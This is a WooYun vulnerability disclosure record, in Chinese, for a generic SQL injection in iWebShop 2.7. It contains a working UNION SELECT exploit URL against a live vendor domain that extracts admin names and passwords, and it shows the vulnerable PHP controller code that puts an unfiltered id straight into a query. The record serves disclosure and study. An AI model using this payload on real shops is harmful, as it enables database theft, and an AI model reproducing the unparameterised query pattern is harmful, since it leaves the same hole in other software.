{"id": 51382, "wybug_id": "wooyun-2014-074729", "wybug_title": "iWebShop商城系统通用型SQL注入", "wybug_corp": "iWebShop", "wybug_author": "kk_skipper", "wybug_date": "2014-09-02 10:25", "wybug_open_date": "2014-12-01 10:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-02：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-12-01：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 某商城系统通用型SQL注入，可拖库 详细说明：  Iwebshop测试版本：iwebshop2.7.14090000.zip (8.25发布最新版本)漏洞exp：http://shop.aircheng.com/index.php?controller=block&action=goodsCommend&id=123)%20union%20select%201,(select%20concat(admin_name,0x2b,password)%20from%20iwebshop_admin)--%20(漏洞证明：\n\nBlock.php获取书本出 未对$id过滤，导致的sql注入。//获取商品的推荐标签数据\npublic function goodsCommend()\t{\t\t//商品字符串的逗号间隔\t\t$id = IFilter::act(IReq::get('id'));\t\t\t\t$goodsDB = new IModel('goods'); \t\t$goodsData = $goodsDB->query(\"id in ({$id})\",\"id,name\");\t\t$goodsCommendDB = new IModel('commend_goods');\t\tforeach($goodsData as $key => $val)\t\t{\t\t\t$goodsCommendData = $goodsCommendDB->query(\"goods_id = \".$val['id']);\t\t\tforeach($goodsCommendData as $k => $v)\t\t\t{\t\t\t\t$goodsData[$key]['commend'][$v['commend_id']] = 1;\t\t\t}\t\t}\t\tdie(JSON::encode($goodsData));\t}}\n   漏洞证明：  见详细   修复方案：  你懂得   版权声明：转载请注明来源 kk_skipper@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}